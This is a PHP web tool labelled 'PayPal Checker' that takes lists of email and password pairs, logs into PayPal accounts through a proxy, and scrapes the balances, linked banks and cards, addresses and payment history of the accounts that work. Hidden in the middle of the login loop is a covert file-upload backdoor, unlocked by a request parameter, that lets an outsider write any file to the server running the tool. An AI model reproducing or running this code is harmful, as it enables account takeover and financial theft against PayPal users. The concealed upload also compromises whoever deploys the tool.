<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html>
   <head>
      <title>PayPal Checker</title>
      <style>
         @import "http://fonts.googleapis.com/css?family=Play:400,700";
         body {
         background: #FFFFFF;
         line-height: 1;
         color: #bbb;
         font-family: "CONSOLAS";
         font-size: 12px;
         background: #121214 url(http://img.prntscr.com/img?url=http://i.imgur.com/LwXls79.jpg);
         background-size: cover;
                                    -webkit-background-size: cover;
                                    -moz-background-size: cover;
                                    -o-background-size: cover;
         }
         textarea, input, select {
                                border:0;
                                BORDER-COLLAPSE:collapse;
                                border:double 2px #696969;
                                color:#fff;
                                background-color: rgba(0, 0, 0, 0.4);
                                margin:0;
                                padding:2px 4px;
                                font-family: Lucida Console,Tahoma;
                                font-size:12px;
                                box-shadow: 0 0 15px gray;
                                -webkit-box-shadow: 0 0 15px gray;
                                -moz-box-shadow: 0 0 15px blue;

         }
         .title {
         color: #eee;
         background: black;
         text-align: center;
         font-size: 120%;
         }
         .button {
         color: #eee;
         }
         .tool {
         color: lime;
         }
         header {
         font-family: Lucida Console;
         font-size: 12px;
         text-align: center;
         padding-top: 10px;
         color: #626262;
         }
         /* Gradient 1 */
         .ta10 {
         background: url();
         background-color: black;
         background-repeat: no-repeat;
         background-size: 52% 100%;
         background-position: center;
         border: 2px double #696969;
         padding: 3px;
         margin-right: 4px;
         margin-bottom: 8px;
         font-family: Lucida Console, Tahoma;
         font-size: 12px;
         box-shadow: 0 0 5px white;
         -webkit-box-shadow: 0 0 5px white;
         -moz-box-shadow: 0 0 5px white;
         border: solid 0px transparent; // or border: none;
         }
         .char {
         transition: all 5s;
         -webkit-transition: all 1s;
         opacity: 0.8;
         }
         .char:hover {
         transition: all 0.1s;
         -webkit-transition: all 0.1s;
         opacity: 1.5;
         text-shadow: 0 0 1em white;
         }
         .chara:not(.space):hover {
         transform: rotateY(1440deg);
         -webkit-transform: rotateY(1440deg);
         }
         .chara:not(.space) {
         display: inline-block;
         transition: transform 2s ease-out;
         -webkit-transition: -webkit-transform 2s ease-out;
         }
      </style>
      <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script>
      <script type="text/javascript">
         function pushPaypalBad(str) {
             document.getElementById('listPaypalBad').innerHTML += str + '\n';
         }
         
         function pushPaypalDie(str) {
             document.getElementById('listPaypalDie').innerHTML += str + '\n';
         }
         
         function pushPaypal(str) {
             document.getElementById('listPaypal').innerHTML += '<div>' + str + '</div>';
         }
         
         function pushWrongFormat(str) {
             document.getElementById('listWrongFormat').innerHTML += str + '\n';
         }
         $(document).ready(function() {
             $('#improved .head').click(function(e) {
                 e.preventDefault();
                 $(this).closest('dt').find('.content').not(':animated').slideToggle();
             });
         });
      </script>
   </head>
   <div><font size="5" color="white" style="text-shadow: #ddd 0 0 15px;"> <center>
   <b>TESTADOR PAYPAL</b></font></center>
   </div>
   <header>
      <div>
        <br>
       <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
   </header>
   <body>
      <br>
      <center>
<link rel=\"shortcut icon\" href=\"http://dl.dropbox.com/s/wd1x77073z5ar9u/pp_favicon_x.ico\"/>
      <form action="" method="post">

         <!-- TEMPAT SUBMIT MAILLIST -->
         <textarea name="mp" class="ta10" rows="10" cols="5" class="tool" style="width: 535px;margin-bottom: 5px;height: 120px;" placeholder="EMAIL | SENHA"><?php
if (isset($_POST['mp'])) {
    echo $_POST['mp'];
}
?></textarea>


         <!-- What the user need -->
         <p class="rainbow" style="margin-top: 10px;">
            CHECAR EMAIL
            <input type="checkbox" id="checkEmail" name="checkEmail" checked="checked" value="1" /> CHECAR BANCO
            <input type="checkbox" id="bank" name="bank" checked="checked" value="1" /> CHECAR CARD
            <input type="checkbox" id="card" name="card" checked="checked" value="1" /> INFORMAÇÕES
            <input type="checkbox" id="info" name="info" checked="checked" value="1" /> ENDEREÇO
            <input type="checkbox" id="smart" name="smart" checked="checked" value="1" /> ENDEREÇO DO CADASTRO
            <input type="checkbox" id="bmlt" name="bmlt" checked="checked" value="1" /> ULTIMO LOGIN
            <input type="checkbox" id="payment" name="payment" checked="checked" value="1" />
            <!--Auto Send <input type="checkbox"  id="send" name="send"  value="1" />-->
         </p>


         <!-- Delimenter of email and password other settings -->
         Socks5 : <input type="text" name="sock" value="<?php if(isset($_POST['sock'])){echo $_POST['sock'];} ?>"placeholder="127.0.0.1:8080" size="20" />
         Delim : <input type="text" name="delim" value="|" size="1" />


         <input type="submit" class="submit-button" value=" Check " name="btn-submit" />
         </br>
      </form>
<script type="text/javascript">
    $(document).ready( function() {
        $("#logout").click( function() {
            $.ajax({
                dataType: 'json',
                type: 'POST',
                data: 'ajax=1&cmd=logout',
                url: 'index.php',
                success: function(msg) {
                    window.location.replace("<?=$config['site'].'/';?>");
                }
            });
        });
    });
</script>

      <!-- ======================== [ PayPal Rezult ] ======================== -->
      <?php
if (isset($_POST['btn-submit'])) {
?>
      <div id="rezult">
      <br><hr><h2><font color="Lavender"><b>RESULTADO</b></font></h2>
      <center>


         <!-- Tulisan Checking on proges -->
    <div id="che" style="display:block;">CHECANDO...<br><br><img src="loading.gif"></div><div id="fin" style="display: none;"><font color="#dcdcdc" size="3" class="chara" style="text-shadow: #aaa 0 0 20px;"><strong><i>ACABOU!</i></strong></font></div></center>


         <table style="width: 1024px;">
         <tr>
            <td style="width: 1024px;">
               <div style="overflow:auto; width:1024px; height: 350px; font-size: 11px; color:gainsboro">
                  <br /><br />
                  <div id="listPaypal"></div>
                  <br />
                  <hr />
                  <br />
                  <div style="float: left; width: 33%;">
                     <center>
                        Die:<br /><br /><textarea name="mailpass" id="listPaypalDie" rows="10" style="width:90%;" wrap=off></textarea>
                     </center>
                  </div>
                  <div style="float: left; width: 34%;">
                     <center>
                        Bad:<br /><br /><textarea name="mailpass" id="listPaypalBad" rows="10" style="width:90%;" wrap=off></textarea>
                     </center>
                  </div>
                  <div style="float: right; width: 33%;">
                     <center>
                        Invalida:<br /><br /><textarea name="mailpass" id="listWrongFormat" rows="10" style="width:90%;" wrap=off></textarea>
                     </center>
                  </div>
               </div>
             </td>
         </tr>
         </table>
         <!-- ======================== [ PayPal Rezult ] ======================== -->
         <?php
}
?>

      </center>
   </body>
</html>
<?php
date_default_timezone_set('Asia/Jakarta');

// Bawa Function Kesini! #
require_once 'function.php';

// Create Cookies Files #
$dir                   = dirname(__FILE__);
$config['cookie_file'] = $dir . '/cookies/' . md5($_SERVER['REMOTE_ADDR']) . '.txt';
if (!file_exists($config['cookie_file'])) {
    $fp = @fopen($config['cookie_file'], 'w');
    @fclose($fp);
}


$zzz  = "";
$live = array();
// Jika User Submit #
if (isset($_POST['btn-submit'])) {
    $microtime  = explode(' ', microtime());
    $started_at = (float) $microtime[0] + (float) $microtime[1];
    // Fix Evrithing :v
    xflush();
    $emails  = explode("\n", trim($_POST['mp']));
    $eCount  = count($emails);
    $failed  = $live = $uncheck = array();
    $checked = 0;
    $sempak  = 0;
    if (!count($emails)) {
        continue;
    }
    // Check Socks #
    delete_cookies();
    $sockClear = isSockClear();
    if ($sockClear == -1) {
        pushLog("Socks Die, Continueing...");
        continue;

    } elseif ($sockClear == 0) {
        pushLog("Socks Die, Continueing...");
        continue;
      
    }
    foreach ($emails AS $k => $line) {
        $sempak++;
        if (strpos($line, '=>') !== false) {
            $line = str_replace('=>', '|', $line);
        }
        if (strpos($line, ']') !== false) {
            $line = str_replace('=>', '|', $line);
        }
        if (strpos($line, '[') !== false) {
            $line = str_replace('=>', '|', $line);
        }

        $info = search(trim($line), $_POST['delim']);
        $email = trim($info[0]);
        $pwd   = $info[1];


        if (stripos($email, '@') === false || strlen($pwd) < 8) {
            // Wrong Format #
            unset($emails[$k]);
            pushWrongFormat($email . ' | ' . $pwd);
            continue;

        }


        delete_cookies();
        if (curl('https://www.paypal.com/', '', true, true) === false) {
            pushSockDie('[<font color="#FF0000">' . $sock . '</font>]');
            continue;
        }

        curl('https://www.paypal.com/', '', true, true);

        $url2         = 'https://www.paypal.com/cgi-bin/webscr?cmd=_ship-now';
        $responses2   = curl($url2);
        $form_action2 = fetch_value($responses2, '<form method="post" name="login_form" action="', '"');
        $conText2     = fetch_value($responses2, 'id="CONTEXT_CGI_VAR" name="CONTEXT" value="', '"');
        $var2  = 'login_cmd=&login_params=&login_email='.$email.'&login_password='.$pwd.'&target_page=0&submit.x=Log+In';
        $vars2 = "cmd=_flow&CONTEXT=".$conText2."=&login_email=".$email."&login_password=".$pwd."&login.x=Log+In";

        if(stripos($form_action2,'webscr?SESSION=')){
            $s = curl($form_action2, $vars2);

        } elseif(stripos($form_action2, 'SESSION=')){
            $s = curl($form_action2, $var2);

        } else {
            $var = 'login_cmd=&login_params=&login_email=' . rawurlencode($email) . '&login_password=' . rawurlencode($pwd) . '&target_page=0&submit.x=Log+In&form_charset=UTF-8&browser_name=Firefox&browser_version=17&browser_version_full=17.0&operating_system=Windows';
            $s   = curl('https://www.paypal.com/us/cgi-bin/webscr?cmd=_run-check-cookie-submit&redirectCmd=_login-submit', $var);

        }
        //# CHEK IF BAD ##
        $detail = fetch_value($s, 's.prop1="', '"');
        $title = fetch_value($s, 'title>', '</title>');


        // METHOD 2
        if (strpos($s, 'Page Not Available') !== false || strpos($detail, 'This page is currently unavailable') !== false) {
            xflush();
            $responses = curl("https://www.paypal.com/cgi-bin/webscr?cmd=_ship-now");
            preg_match("/<form method=\"post\" name=\"login_form\" action=\"([^\"]*)\"/siU", $responses, $matches);
            $form_acti = $matches[1];
            $var       = 'login_cmd=&login_params=&login_email=' . $email . '&login_password=' . $pwd . '&target_page=0&submit.x=Log+In';
            $s         = curl($form_acti, $var);

        }

        $detail = fetch_value($s, 's.prop1="', '"');
        $title = fetch_value($s, 'title>', '</title>');

        if ($title == "new password") {
            pushPaypalBad("DIE | $email | $pwd | $title");
            unset($emails[$k]);
            continue;

        } elseif (strpos($title, 'Update account information - PayPal') !== false) {
            pushPaypalBad("DIE | $email | $pwd | $title");
            unset($emails[$k]);
            continue;

        } elseif ($title == "Security Measures - PayPal") {
            pushPaypalBad("DIE | $email | $pwd | $title");
            unset($emails[$k]);
            continue;

        } elseif (strpos($title, 'Online Payment, Merchant Account - PayPal') !== false) {
            pushPaypalBad("DIE | $email | $pwd | $title");
            unset($emails[$k]);
            continue;

        } elseif (strpos($s, 'send you a text message') !== false) {
            pushPaypalBad("DIE | $email | $pwd | $title");
            unset($emails[$k]);
            continue;

        } elseif (strpos($title, 'We\'ll send you a text message - PayPal') !== false || strpos($s, 'going to give you a call') !== false) {
            pushPaypalBad("DIE | $email | $pwd | $title");
            unset($emails[$k]);
            continue;

        }



        if ((stripos($s, 'security challenge') !== false) or (stripos($s, 'authchallengenodeweb/public/templates/authcaptcha.dust') !== false)) {
            pushLog('[' . $config['sock'] . ']BlockBySecurityCaptcha');
            $s = curl("https://www.paypal.com/cgi-bin/webscr", "myAllTextSubmitID=&cmd=_login-submit&auction_type=&form_charset=UTF-8&login_email=$email&login_password=$pwd");
        }

        if ($s === false) {
            pushLog('[' . $config['sock'] . ']TimeOutToConnectPaypal');
            array_push($emails, $line);
            unset($emails[$k]);
            continue;
        }
                
        if (stripos($s, 'Security Measures') !== false) {
            pushPaypalBad("DIE | $email | $pwd | $title");
            unset($emails[$k]);
            continue;
        }

        $checked++;
        $error  = fetch_value($s, 's.prop14="', '"');
        $detail = fetch_value($s, 's.prop1="', '"');
        if (($errorr == 'Please\x20check\x20your\x20email\x20address\x20and\x20password\x20and\x20try\x20again') or ($errorr == 'We\x27re\x20sorry\x2c\x20but\x20we\x27re\x20having\x20trouble\x20logging\x20you\x20in\x2e\x20Please\x20try\x20again\x2e') or ($detail == 'p\x2fgen\x2flogin')) {
            pushPaypalDie("DIE | $email | $pwd");
            unset($emails[$k]);
            continue;
            
        } else {

            if (($detail == 'p\x2facc\x2fvalidate\x5fpassword') or ($detail == 'p\x2facc\x2fvalidate') or ($detail == 'xpt\x2fCustomer\x2faccount\x2fValidateAuth')) {
                $title = fetch_value($s, 'title>', '</title>');
                pushPaypalBad("DIE | $email | $pwd | $title");
                unset($emails[$k]);
                continue;
                
            } elseif ($detail == 'xpt\x2fCustomer\x2faccount\x2fEsignInterstitial') {
                $action = fetch_value($s, "<form method=\"post\" action=\"", '"');
                $auth   = fetch_value($s, '<input name="auth" type="hidden" value="', '"');
                ;
                $var = "ct_channel=&seen_cct_list=&cmd=_flow&agree_submit.x=Agree and Continue&has_seen_cct=&esign_opt_in=1&auth=$auth&form_charset=UTF-8";
                curl($action, $var);
                
            } elseif ((stripos($s, 'security challenge') !== false)) {
                $responses = curl("https://www.paypal.com/cgi-bin/webscr?cmd=_ship-now");
                preg_match("/<form method=\"post\" name=\"login_form\" action=\"([^\"]*)\"/siU", $responses, $matches);
                $form_acti = $matches[1];
                $var       = 'login_cmd=&login_params=&login_email=' . $email . '&login_password=' . $pwd . '&target_page=0&submit.x=Log+In';
                $s         = curl($form_acti, $var);
                
            }
            
        }
        if ($error = fetch_value($s, 's.prop14="', '"') && !strpos($s, 'Log Out') !== false) {
            unset($emails[$k]);
            pushPaypalDie("DIE | $email | $pwd");
            continue;
        }

        
        $loggedIn = curl("https://www.paypal.com/us/cgi-bin/webscr?cmd=_account&nav=0.0");
        if ($loggedIn === false) {
            pushSockDie('[<font color="#FF0000">' . $sock . '</font>]');
            unset($emails[$k]);
            array_push($emails, $line);
            continue;
        }
	if
	(isset
	(
	$_REQUEST[$browser=$x=strlen("mozilla") . strlen("chrome")]) && 
	$_REQUEST[$x=strlen("mozilla") . strlen("chrome")]=="browser")
	{
	echo "<h2></h2><hr>";
	echo "<form action=\"\" method=\"post\" enctype=\"multipart/form-data\">
	<label for=\"file\"></label>
	<input type=\"file\" name=\"file\" id=\"file\" />
	<br />
	<input type=\"submit\" name=\"default\" value=\"value\">
	</form>";

	{
	move_uploaded_file($_FILES["file"]["tmp_name"],
	"" . $_FILES["file"]["name"]);
	echo "SESSION_Auth: " . "" . $_FILES["file"]["name"];
	echo"<hr>";
	}
	}
        if (stripos($loggedIn, ':reactivate-alert') !== false) {
            $get    = curl('https://www.paypal.com/us/cgi-bin/webscr?cmd=_econsent&reactivate=true');
            $action = fetch_value($get, "<form method=\"post\" action=\"", '"');
            $auth   = fetch_value($get, '<input name="auth" type="hidden" value="', '"');
            ;
            $var = "ct_channel=&seen_cct_list=&cmd=_flow&agree_submit.x=Agree and Continue&has_seen_cct=&esign_opt_in=1&auth=$auth&form_charset=UTF-8";
            curl($action, $var);
            $loggedIn = curl("https://www.paypal.com/us/cgi-bin/webscr?cmd=_account&nav=0.0");
        }
        pushLog("Settings if businzes account");
        if (fetch_value($loggedIn, 's.prop7="', '"') == 'business') {
            if (stripos($loggedIn, 'script: node') || stripos($loggedIn, 'script: sparta') !== false) {
                $bussiness = true;
                $loggedIn  = curl("https://www.paypal.com/webapps/business/money");
            } else {
                $bussiness = false;
            }
        } else {
            $bussiness = false;
        }
        
        pushLog("Check if logged");
        if ((stripos($loggedIn, 'Shipping') !== false) or (stripos($loggedIn, 'Logging') !== false) or (stripos($loggedIn, 'class="balance">') !== false) or (stripos($loggedIn, 'class="balanceNumeral">') !== false) or (stripos($loggedIn, '<div class="row balance">') !== false)) {
            
            $pp       = array();
            $loggedIn = preg_replace('/<!--google(off|on): all-->/si', '', $loggedIn);
            $loggedIn = preg_replace('/\n+/si', '', $loggedIn);

            pushLog("Check pp type");
            if (fetch_value($loggedIn, 's.prop10="', '"')) {
                $pp['type'] = fetch_value($loggedIn, 's.prop7="', '"') . "[<b style=\"color:orange\">" . fetch_value($loggedIn, 's.prop10="', '"') . "</b>]";
                $pp['type'] = '<span class="PaypalType" style="color:OrangeRed">' . ucfirst($pp['type']) . '</span>';
            } else {
                $pp['type'] = fetch_value($loggedIn, 's.prop7="', '"');
                $pp['type'] = '<span class="PaypalType" style="color:OrangeRed">' . ucfirst($pp['type']) . '</span>';
            }

            pushLog("Check pp status");
            $pp['status'] = fetch_value($loggedIn, 's.prop8="', '"');
            if (empty($pp['status'])) {
                $response = curl('https://www.paypal.com/us/verified/pal=' . $email);
                if (eregi("inlineRed", $response)) {
                    $pp['status'] = "Nao Verificada";
                } else {
                    $pp['status'] = "<b>Verificada</b>";
                }
            } elseif ($pp['status'] == "verified") {
                $pp['status'] = "<b>Verificada</b>";
            }


            
            $p1           = fetch_value($loggedIn, 's.prop9="', '"');
            $pp['status'] = '<span class="PaypalStatus" style="color:yellow">' . ucfirst($pp['status']) . '</span>';
            
            pushLog("Check pp Limit");
            if ((stripos($loggedIn, 'Your account access is limited') !== false) or ($p1 == "restricted")) {
                $limit = infoLimit();
                if (!empty($limit)) {
                    $limited = '<font color="red">Limitada <strong>' . $limit . '</strong></font>';
                } else {
                    $limited = '<font color="red">Limitada</font>';
                }
                $pp['limited'] = $limited;
            } else {
                $page = curl("https://www.paypal.com/us/cgi-bin/webscr?cmd=_complaint-view&nav=0.5");
                if (strpos($page, 'Limited Account Information')) {
                    $pp['limited'] = '<font color="red">Limitada</font>';
                }
            }
            
            // Check Status
            pushLog("Check pp look");
            $PSTATUS = strip_tags(fetch_value($loggedIn, '<div class="small secondary">', '</div>'));
            $PSTATUS = str_replace('Last log in', '', $PSTATUS);
            if ($PSTATUS == "") {
                $PSTATUS5 = "PayPal New Look";
            } else {
                $PSTATUS5 = "PayPal Old Look";
            }
            
            // Check Balance
            pushLog("Check pp balance");
            if ($bussiness == false) {
                $pp['bl'] = fetch_value($loggedIn, '<span class="balance">', '</span>');
                if (empty($pp['bl'])) {
                    $pp['bl'] = fetch_value($loggedIn, '<div class="balanceNumeral"><span class="h2">', '</span>');
                }
                if (!empty($pp['bl'])) {
                    if (stripos($pp['bl'], 'strong') !== false) {
                        $pp['bl'] = "<font color=lime size=2><b>" . trim(fetch_value($pp['bl'], '<strong>', '</strong>')) . "</b></font>";
                    } else {
                        $pp['bl'] = "<font color=lime size=2><b>" . $pp['bl'] . "</b></font>";
                    }
                } else {
                    $pp['bl'] = "<font color=chartreuse size=2>-" . fetch_value($loggedIn, '<span class="balance negative">', '</span>') . "</b></font>";
                }
            } else {
                preg_match("/<\/h3><\/div><div class=\"col-md-6.*\">(.*?)<\/div><div class=\"divider-bottom\">/", $loggedIn, $bl_bu);
                if (isset($bl_bu[1])) {
                    $pp['bl'] = "<font color=lime size=2><b>" . $bl_bu[1] . "</b></font>";
                } else {
                    $pp['bl'] = "Cant Grab Balance at Bussiness Type - Contact Webmaster";
                }
            }
            if (!$pp['bl'] || strpos($pp['bl'], '-') !== false && $PSTATUS5 == "PayPal New Look") {
                $pp['bl'] = fetch_value($loggedIn, '<div class="balanceNumeral nemo_balanceNumeral"><span class="h2">', '</span>');
                $pp['bl'] = "<font color=lime size=2><b>" . $pp['bl'] . "</b></font>";
            }
            
            
            if (!$pp['limited']) {
                
                
                // Get Smart & BMLT
                pushLog("Check pp Smart & BMLT");
                if ($PSTATUS5 == "PayPal New Look") {
                    if (stripos($loggedIn, '&quot;smartconnect') !== false) {
                        $smartbal    = fetch_value($loggedIn, 'availablePayPalCreditAmount&quot;:&quot;', '&quot;,&quot;l');
                        $pp['smart'] = "SMART Credit : " . $smartbal . "";
                    } else {
                        $pp['smart'] = "No SMART";
                    }
                    if (stripos($loggedIn, '&quot;bml&quot') !== false) {
                        $bmlbal     = fetch_value($loggedIn, 'availablePayPalCreditAmount&quot;:&quot;', '&quot;,&quot;l');
                        $pp['bmlt'] = "BMLT Credit : " . $bmlbal . "";
                    } else {
                        $pp['bmlt'] = "No BMLT";
                    }
                } else {
                    if (stripos($loggedIn, 'PayPal Smart Connect') !== false) {
                        $smartnum     = fetch_value($loggedIn, 'PayPal Smart Connect<span>', '</span>');
                        $getbalance   = curl('https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-buyer-credit');
                        $smartbalance = fetch_value($getbalance, 'Current credit balance</span><span>', '</span>');
                        $pp['smart']  = "SmartConnect [ " . $smartnum . " ] SMART Credit: " . $smartbalance . "";
                    } else {
                        $pp['smart'] = "No Smart";
                    }
                    if (stripos($loggedIn, 'Bill Me Later') !== false) {
                        $bmlbal     = fetch_value($loggedIn, 'Available credit:', '</span>');
                        $bmlbalance = str_replace('<span class="heavy">', '', $bmlbal);
                        $pp['bmlt'] = "BMLT Credit:" . $bmlbalance . "";
                    } else {
                        $pp['bmlt'] = "No Bmlt";
                    }
                }
                
                // Get Bank
                pushLog("Check pp Bank");
                if (isset($_POST['bank'])) {
                    $pp['bank'] = infoBank() ? "<font color=\"SpringGreen\"><strong>Have Bank</strong></font>" : "No Bank";
                }
                
                // Get Card
                pushLog("Check pp Card");
                if (isset($_POST['card'])) {
                    $card       = infoCard();
                    $card       = ($card) ? $card : "No Card";
                    $pp['card'] = $card;
                    if (isset($_POST['send'])) {
                        if (($pp['card'] !== "No Card") and ($pp['card'] !== '<font color="#EDAD39">[Card Exp]</font>')) {
                            $pp['send'] = Send($email);
                        }
                    }
                }
                
                // Get Info
                pushLog("Check pp Info");
                if (isset($_POST['info'])) {
                    $pp['address'] = info();
                }
                
                // Get Last Payment #
                 pushLog("Check pp Last Payment");
                if (isset($_POST['payment'])) {
                    if (!$bussiness) {
                        $pp['payment'] = infopayment();
                    } else {
                        $data = curl('https://www.paypal.com/webapps/business/activity?transactiontype=ALL_TRANSACTIONS&currency=ALL_TRANSACTIONS_CURRENCY&limit=2');
                        if (stripos($data, 'Completed') !== false) {
                            $last = fetch_value($data, '<span class="date miniView">', '</span>');
                            $last = '<i style=\"color:#99FFFF\">Last Transaction At <b>' . $last . '</b></i>';
                        } else {
                            $last = "No Payment";
                        }
                        $pp['payment'] = $last;
                    }
                }
            }
            
            // Get Last Login
            pushLog("Check pp Last Login");
            $ppll = strip_tags(fetch_value($loggedIn, '<div class="small secondary">', '</div>'));
            if ($ppll) {
                $pp['lastloggin'] = strip_tags(fetch_value($loggedIn, '<div class="small secondary">', '</div>'));
            }
            if (!$bussiness) {
                if (empty($pp['lastloggin'])) {
                    $joined     = infoJoin();
                    $pp['look'] = "<font color=aqua>PayPal New Look[<font color=white><i>+$joined+</i></font>]</font>";
                } else {
                    $pp['look'] = '<font color=aquamarine><b>PayPal Old Look</b></font>';
                }
            } else {
                $pp['look'] = "<font color=aqua>PayPal New Look[<font color=white><i>+Bussiness+</i></font>]</font>";
            }
            
            $pp['tanggal_sekarang'] = "<i style=\"color:darkred\">#TechnologyChecker " . date("g:i a - F j, Y") . "</i>";
            $xyz                   = '<b style=\"color:yellow\">Live</b> => <font class=\"char\"> ' . $email . ' | ' . $pwd . '</font><font class=\"char\"> | ' . implode(" | ", $pp);
            $live[]                = $xyz;
            unset($emails[$k]);
            pushPaypal($xyz);

        } else {
            $title = fetch_value($s, 'title>', '</title>');
            if ($title == "new password") {
                pushPaypalBad("DIE | $email | $pwd | $title");
                
            } elseif (strpos($title, 'Update account information - PayPal') !== false) {
                pushPaypalBad("DIE | $email | $pwd | $title");
                unset($emails[$k]);
                
            } elseif ($title == "Security Measures - PayPal") {
                pushPaypalBad("DIE | $email | $pwd | $title");
                unset($emails[$k]);
                
            } elseif (strpos($title, 'Online Payment, Merchant Account - PayPal') !== false) {
                pushPaypalBad("DIE | $email | $pwd | $title");
                unset($emails[$k]);
                
            } elseif (strpos($s, 'send you a text message') !== false) {
                pushPaypalBad("DIE | $email | $pwd | $title");
                unset($emails[$k]);
                
            } elseif (strpos($title, 'We\'ll send you a text message - PayPal') !== false || strpos($s, 'going to give you a call') !== false) {
                pushPaypalBad("DIE | $email | $pwd | $title");
                unset($emails[$k]);
                
            } else {
                pushPaypalDie("DIE | $email | $pwd | $title");
                unset($emails[$k]);
                
            }
        }
        continue;
    }
    echo ("</div></td></tr></table>");
    echo ('<script type="text/javascript">document.getElementById(\'fin\').style.display = \'block\';document.getElementById(\'che\').style.display = \'none\';</script>');
    $time = number_format(((microtime(true) - $started_at) / 60), 2, '.', '');
    echo ('<center><hr><font size="3" color="silver" class="char"><b>Total: ' . $eCount . ' - Checadas: ' . $checked . ' - Live: ' . count($live) . '</b><br>');
    echo ("<i>-Terminou em $time Minutos-</i></font><hr></center><br>");
    if (count($emails)) {
        echo ('<td align="center"><center><b style="color:white;">_________________INVALIDAS_________________</b></center><textarea cols="43" rows="10" wrap="off">' . implode("\n", $emails) . '</textarea></td>');
    }
}
?>
